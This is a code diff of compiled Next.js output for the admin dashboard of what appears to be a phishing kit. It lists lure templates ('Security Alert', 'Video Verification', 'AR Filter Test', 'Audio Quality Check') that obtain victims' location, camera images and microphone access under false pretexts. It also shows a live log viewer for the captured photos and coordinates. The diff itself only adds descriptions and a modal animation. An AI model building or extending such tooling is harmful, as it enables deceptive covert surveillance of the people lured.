@@ -383,12 +383,12 @@ __turbopack_context__.s({
     "default": (()=>DashboardPage)
 });
 var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/next/dist/server/route-modules/app-page/vendored/ssr/react-jsx-dev-runtime.js [app-ssr] (ecmascript)");
-var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/next/dist/server/route-modules/app-page/vendored/ssr/react.js [app-ssr] (ecmascript)"); // Added useState
+var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/next/dist/server/route-modules/app-page/vendored/ssr/react.js [app-ssr] (ecmascript)");
 var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$contexts$2f$LogContext$2e$tsx__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/src/contexts/LogContext.tsx [app-ssr] (ecmascript)");
 var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$ui$2f$button$2e$tsx__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/src/components/ui/button.tsx [app-ssr] (ecmascript)");
 var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$ui$2f$card$2e$tsx__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/src/components/ui/card.tsx [app-ssr] (ecmascript)");
 var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$dashboard$2f$PhishingLinkCard$2e$tsx__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/src/components/dashboard/PhishingLinkCard.tsx [app-ssr] (ecmascript)");
-var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$lucide$2d$react$2f$dist$2f$esm$2f$icons$2f$map$2d$pin$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__$3c$export__default__as__MapPin$3e$__ = __turbopack_context__.i("[project]/node_modules/lucide-react/dist/esm/icons/map-pin.js [app-ssr] (ecmascript) <export default as MapPin>"); // Added Sparkles, Lock, ShieldAlert
+var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$lucide$2d$react$2f$dist$2f$esm$2f$icons$2f$map$2d$pin$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__$3c$export__default__as__MapPin$3e$__ = __turbopack_context__.i("[project]/node_modules/lucide-react/dist/esm/icons/map-pin.js [app-ssr] (ecmascript) <export default as MapPin>");
 var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$lucide$2d$react$2f$dist$2f$esm$2f$icons$2f$camera$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__$3c$export__default__as__Camera$3e$__ = __turbopack_context__.i("[project]/node_modules/lucide-react/dist/esm/icons/camera.js [app-ssr] (ecmascript) <export default as Camera>");
 var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$lucide$2d$react$2f$dist$2f$esm$2f$icons$2f$mic$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__$3c$export__default__as__Mic$3e$__ = __turbopack_context__.i("[project]/node_modules/lucide-react/dist/esm/icons/mic.js [app-ssr] (ecmascript) <export default as Mic>");
 var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$lucide$2d$react$2f$dist$2f$esm$2f$icons$2f$trash$2d$2$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__$3c$export__default__as__Trash2$3e$__ = __turbopack_context__.i("[project]/node_modules/lucide-react/dist/esm/icons/trash-2.js [app-ssr] (ecmascript) <export default as Trash2>");
@@ -404,7 +404,9 @@ var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$ui$2f$s
 var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$image$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/next/image.js [app-ssr] (ecmascript)");
 var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$hooks$2f$use$2d$toast$2e$ts__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/src/hooks/use-toast.ts [app-ssr] (ecmascript)");
 var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$ui$2f$toast$2e$tsx__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/src/components/ui/toast.tsx [app-ssr] (ecmascript)");
+var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$utils$2e$ts__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/src/lib/utils.ts [app-ssr] (ecmascript)");
 "use client";
+;
 ;
 ;
 ;
@@ -433,13 +435,15 @@ const phishingCategories = [
                 id: 'security-alert',
                 name: 'Template: Security Alert',
                 url: '/phishing/location/security-alert',
-                Icon: __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$lucide$2d$react$2f$dist$2f$esm$2f$icons$2f$shield$2d$alert$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__$3c$export__default__as__ShieldAlert$3e$__["ShieldAlert"]
+                Icon: __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$lucide$2d$react$2f$dist$2f$esm$2f$icons$2f$shield$2d$alert$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__$3c$export__default__as__ShieldAlert$3e$__["ShieldAlert"],
+                description: "Simulates an urgent security notification."
             },
             {
                 id: 'content-unlock',
                 name: 'Template: Content Unlock',
                 url: '/phishing/location/content-unlock',
-                Icon: __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$lucide$2d$react$2f$dist$2f$esm$2f$icons$2f$lock$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__$3c$export__default__as__Lock$3e$__["Lock"]
+                Icon: __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$lucide$2d$react$2f$dist$2f$esm$2f$icons$2f$lock$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__$3c$export__default__as__Lock$3e$__["Lock"],
+                description: "Simulates unlocking region-restricted content."
             }
         ]
     },
@@ -459,13 +463,15 @@ const phishingCategories = [
                 id: 'video-verification',
                 name: 'Template: Video Verification',
                 url: '/phishing/camera/video-verification',
-                Icon: __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$lucide$2d$react$2f$dist$2f$esm$2f$icons$2f$image$2d$plus$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__$3c$export__default__as__ImagePlus$3e$__["ImagePlus"]
+                Icon: __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$lucide$2d$react$2f$dist$2f$esm$2f$icons$2f$image$2d$plus$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__$3c$export__default__as__ImagePlus$3e$__["ImagePlus"],
+                description: "Simulates a video ID verification process."
             },
             {
                 id: 'ar-filter',
                 name: 'Template: AR Filter Test',
                 url: '/phishing/camera/ar-filter',
-                Icon: __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$lucide$2d$react$2f$dist$2f$esm$2f$icons$2f$camera$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__$3c$export__default__as__Camera$3e$__["Camera"]
+                Icon: __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$lucide$2d$react$2f$dist$2f$esm$2f$icons$2f$camera$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__$3c$export__default__as__Camera$3e$__["Camera"],
+                description: "Simulates trying out an AR filter."
             }
         ]
     },
@@ -477,17 +483,20 @@ const phishingCategories = [
             {
                 id: 'voice-assistant',
                 name: 'Template: Voice Assistant Setup',
-                url: '/phishing/audio/voice-assistant'
+                url: '/phishing/audio/voice-assistant',
+                description: "Simulates setting up a voice assistant."
             },
             {
                 id: 'speech-to-text',
                 name: 'Template: Speech-to-Text Demo',
-                url: '/phishing/audio/speech-to-text'
+                url: '/phishing/audio/speech-to-text',
+                description: "Simulates a speech-to-text service."
             },
             {
                 id: 'quality-check',
                 name: 'Template: Audio Quality Check',
-                url: '/phishing/audio/quality-check'
+                url: '/phishing/audio/quality-check',
+                description: "Simulates a microphone quality check."
             }
         ]
     }
@@ -498,6 +507,20 @@ function DashboardPage() {
     const previousLatestLogIdRef = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["useRef"])(null);
     const isInitialLoadRef = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["useRef"])(true);
     const [expandedImageUrl, setExpandedImageUrl] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["useState"])(null);
+    const [isModalAnimating, setIsModalAnimating] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["useState"])(false);
+    const openModal = (url)=>{
+        setExpandedImageUrl(url);
+        // Delay setting isModalAnimating to true to allow initial render with closed state
+        requestAnimationFrame(()=>{
+            setIsModalAnimating(true);
+        });
+    };
+    const closeModal = ()=>{
+        setIsModalAnimating(false);
+        setTimeout(()=>{
+            setExpandedImageUrl(null);
+        }, 300); // Match CSS transition duration
+    };
     (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["useEffect"])(()=>{
         if (isLoading) return;
         if (logs.length === 0) {
@@ -532,14 +555,14 @@ function DashboardPage() {
                                 className: "mr-2 h-4 w-4"
                             }, void 0, false, {
                                 fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                lineNumber: 93,
+                                lineNumber: 111,
                                 columnNumber: 15
                             }, this),
                             " Open in Maps"
                         ]
                     }, void 0, true, {
                         fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                        lineNumber: 89,
+                        lineNumber: 107,
                         columnNumber: 13
                     }, this);
                 }
@@ -578,10 +601,13 @@ function DashboardPage() {
                         width: 160,
                         height: 120,
                         className: "rounded-md border object-contain cursor-pointer hover:opacity-80 transition-opacity",
-                        onClick: ()=>setExpandedImageUrl(camData.imageUrl)
+                        onClick: ()=>openModal(camData.imageUrl),
+                        style: {
+                            aspectRatio: '4/3'
+                        }
                     }, void 0, false, {
                         fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                        lineNumber: 124,
+                        lineNumber: 142,
                         columnNumber: 11
                     }, this),
                     /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("details", {
@@ -589,32 +615,32 @@ function DashboardPage() {
                         children: [
                             /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("summary", {
                                 className: "cursor-pointer text-muted-foreground hover:text-foreground",
-                                children: "Show Base64 Data"
+                                children: "Show Base64 Data (truncated)"
                             }, void 0, false, {
                                 fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                lineNumber: 133,
+                                lineNumber: 152,
                                 columnNumber: 13
                             }, this),
                             /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("pre", {
                                 className: "whitespace-pre-wrap break-all text-xs bg-muted/30 p-2 rounded-sm mt-1",
                                 children: JSON.stringify({
-                                    imageUrl: `${camData.imageUrl.substring(0, 100)}... (truncated)`
+                                    imageUrl: `${camData.imageUrl.substring(0, 100)}...`
                                 }, null, 2)
                             }, void 0, false, {
                                 fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                lineNumber: 134,
+                                lineNumber: 153,
                                 columnNumber: 13
                             }, this)
                         ]
                     }, void 0, true, {
                         fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                        lineNumber: 132,
+                        lineNumber: 151,
                         columnNumber: 11
                     }, this)
                 ]
             }, void 0, true, {
                 fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                lineNumber: 123,
+                lineNumber: 141,
                 columnNumber: 9
             }, this);
         }
@@ -625,7 +651,7 @@ function DashboardPage() {
                 children: JSON.stringify(locData, null, 2)
             }, void 0, false, {
                 fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                lineNumber: 141,
+                lineNumber: 160,
                 columnNumber: 16
             }, this);
         }
@@ -634,7 +660,7 @@ function DashboardPage() {
             children: JSON.stringify(data, null, 2)
         }, void 0, false, {
             fileName: "[project]/src/app/admin/dashboard/page.tsx",
-            lineNumber: 143,
+            lineNumber: 162,
             columnNumber: 12
         }, this);
     };
@@ -655,27 +681,27 @@ function DashboardPage() {
                                                 className: "mr-3 h-7 w-7 text-primary"
                                             }, void 0, false, {
                                                 fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                                lineNumber: 152,
+                                                lineNumber: 171,
                                                 columnNumber: 15
                                             }, this),
                                             "Captured Data Logs"
                                         ]
                                     }, void 0, true, {
                                         fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                        lineNumber: 151,
+                                        lineNumber: 170,
                                         columnNumber: 13
                                     }, this),
                                     /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$ui$2f$card$2e$tsx__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["CardDescription"], {
                                         children: "View all data captured from phishing page interactions. This data updates in real-time."
                                     }, void 0, false, {
                                         fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                        lineNumber: 155,
+                                        lineNumber: 174,
                                         columnNumber: 13
                                     }, this)
                                 ]
                             }, void 0, true, {
                                 fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                lineNumber: 150,
+                                lineNumber: 169,
                                 columnNumber: 11
                             }, this),
                             /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$ui$2f$card$2e$tsx__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["CardContent"], {
@@ -685,7 +711,7 @@ function DashboardPage() {
                                         children: "Loading logs..."
                                     }, void 0, false, {
                                         fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                        lineNumber: 161,
+                                        lineNumber: 180,
                                         columnNumber: 15
                                     }, this) : logs.length === 0 ? /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                         className: "text-center py-8 text-muted-foreground",
@@ -694,7 +720,7 @@ function DashboardPage() {
                                                 className: "mx-auto h-12 w-12 mb-2"
                                             }, void 0, false, {
                                                 fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                                lineNumber: 164,
+                                                lineNumber: 183,
                                                 columnNumber: 17
                                             }, this),
                                             /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
@@ -702,20 +728,20 @@ function DashboardPage() {
                                                 children: "No logs captured yet."
                                             }, void 0, false, {
                                                 fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                                lineNumber: 165,
+                                                lineNumber: 184,
                                                 columnNumber: 17
                                             }, this),
                                             /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
                                                 children: "Interact with the phishing templates to see data here."
                                             }, void 0, false, {
                                                 fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                                lineNumber: 166,
+                                                lineNumber: 185,
                                                 columnNumber: 17
                                             }, this)
                                         ]
                                     }, void 0, true, {
                                         fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                        lineNumber: 163,
+                                        lineNumber: 182,
                                         columnNumber: 15
                                     }, this) : /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$ui$2f$scroll$2d$area$2e$tsx__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["ScrollArea"], {
                                         className: "h-[400px] w-full rounded-md border p-4 bg-secondary/30",
@@ -731,13 +757,13 @@ function DashboardPage() {
                                                                 children: log.id
                                                             }, void 0, false, {
                                                                 fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                                                lineNumber: 172,
+                                                                lineNumber: 191,
                                                                 columnNumber: 79
                                                             }, this)
                                                         ]
                                                     }, void 0, true, {
                                                         fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                                        lineNumber: 172,
+                                                        lineNumber: 191,
                                                         columnNumber: 21
                                                     }, this),
                                                     /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
@@ -748,7 +774,7 @@ function DashboardPage() {
                                                         ]
                                                     }, void 0, true, {
                                                         fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                                        lineNumber: 173,
+                                                        lineNumber: 192,
                                                         columnNumber: 21
                                                     }, this),
                                                     /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
@@ -760,13 +786,13 @@ function DashboardPage() {
                                                                 children: log.type
                                                             }, void 0, false, {
                                                                 fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                                                lineNumber: 174,
+                                                                lineNumber: 193,
                                                                 columnNumber: 72
                                                             }, this)
                                                         ]
                                                     }, void 0, true, {
                                                         fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                                        lineNumber: 174,
+                                                        lineNumber: 193,
                                                         columnNumber: 21
                                                     }, this),
                                                     /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
@@ -777,7 +803,7 @@ function DashboardPage() {
                                                         ]
                                                     }, void 0, true, {
                                                         fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                                        lineNumber: 175,
+                                                        lineNumber: 194,
                                                         columnNumber: 21
                                                     }, this),
                                                     /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
@@ -788,7 +814,7 @@ function DashboardPage() {
                                                         ]
                                                     }, void 0, true, {
                                                         fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                                        lineNumber: 176,
+                                                        lineNumber: 195,
                                                         columnNumber: 21
                                                     }, this),
                                                     /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
@@ -799,18 +825,18 @@ function DashboardPage() {
                                                         ]
                                                     }, void 0, true, {
                                                         fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                                        lineNumber: 177,
+                                                        lineNumber: 196,
                                                         columnNumber: 21
                                                     }, this)
                                                 ]
                                             }, log.id, true, {
                                                 fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                                lineNumber: 171,
+                                                lineNumber: 190,
                                                 columnNumber: 19
                                             }, this))
                                     }, void 0, false, {
                                         fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                        lineNumber: 169,
+                                        lineNumber: 188,
                                         columnNumber: 15
                                     }, this),
                                     /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$ui$2f$button$2e$tsx__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["Button"], {
@@ -822,26 +848,26 @@ function DashboardPage() {
                                                 className: "mr-2 h-4 w-4"
                                             }, void 0, false, {
                                                 fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                                lineNumber: 183,
+                                                lineNumber: 202,
                                                 columnNumber: 15
                                             }, this),
                                             " Delete All Logs"
                                         ]
                                     }, void 0, true, {
                                         fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                        lineNumber: 182,
+                                        lineNumber: 201,
                                         columnNumber: 13
                                     }, this)
                                 ]
                             }, void 0, true, {
                                 fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                lineNumber: 159,
+                                lineNumber: 178,
                                 columnNumber: 11
                             }, this)
                         ]
                     }, void 0, true, {
                         fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                        lineNumber: 149,
+                        lineNumber: 168,
                         columnNumber: 9
                     }, this),
                     /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$ui$2f$card$2e$tsx__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["Card"], {
@@ -854,20 +880,20 @@ function DashboardPage() {
                                         children: "Phishing Page Templates"
                                     }, void 0, false, {
                                         fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                        lineNumber: 190,
+                                        lineNumber: 209,
                                         columnNumber: 13
                                     }, this),
                                     /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$ui$2f$card$2e$tsx__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["CardDescription"], {
                                         children: "Use these links to simulate phishing attempts and observe data capture. Each link opens in a new tab."
                                     }, void 0, false, {
                                         fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                        lineNumber: 191,
+                                        lineNumber: 210,
                                         columnNumber: 13
                                     }, this)
                                 ]
                             }, void 0, true, {
                                 fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                lineNumber: 189,
+                                lineNumber: 208,
                                 columnNumber: 11
                             }, this),
                             /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$ui$2f$card$2e$tsx__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["CardContent"], {
@@ -878,53 +904,61 @@ function DashboardPage() {
                                         Icon: category.Icon,
                                         links: category.links.map((link)=>({
                                                 ...link,
+                                                description: link.description || "Generic template description.",
                                                 Icon: link.Icon || category.Icon
                                             }))
                                     }, category.title, false, {
                                         fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                        lineNumber: 197,
+                                        lineNumber: 216,
                                         columnNumber: 15
                                     }, this))
                             }, void 0, false, {
                                 fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                                lineNumber: 195,
+                                lineNumber: 214,
                                 columnNumber: 11
                             }, this)
                         ]
                     }, void 0, true, {
                         fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                        lineNumber: 188,
+                        lineNumber: 207,
                         columnNumber: 9
                     }, this)
                 ]
             }, void 0, true, {
                 fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                lineNumber: 148,
+                lineNumber: 167,
                 columnNumber: 7
             }, this),
             expandedImageUrl && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
-                className: "fixed inset-0 z-[101] flex items-center justify-center bg-black/80 p-4 cursor-zoom-out",
-                onClick: ()=>setExpandedImageUrl(null),
-                children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$image$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["default"], {
-                    src: expandedImageUrl,
-                    alt: "Expanded captured image",
-                    width: 0,
-                    height: 0,
-                    sizes: "100vw",
-                    style: {
-                        width: 'auto',
-                        height: 'auto'
-                    },
-                    className: "max-w-[90vw] max-h-[90vh] object-contain rounded-lg shadow-xl bg-white p-1",
-                    onClick: (e)=>e.stopPropagation()
+                className: (0, __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$utils$2e$ts__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["cn"])("fixed inset-0 z-[101] flex items-center justify-center p-4 cursor-zoom-out", "transition-opacity duration-300 ease-in-out", isModalAnimating ? "opacity-100 bg-black/80" : "opacity-0 bg-black/0 pointer-events-none"),
+                onClick: closeModal,
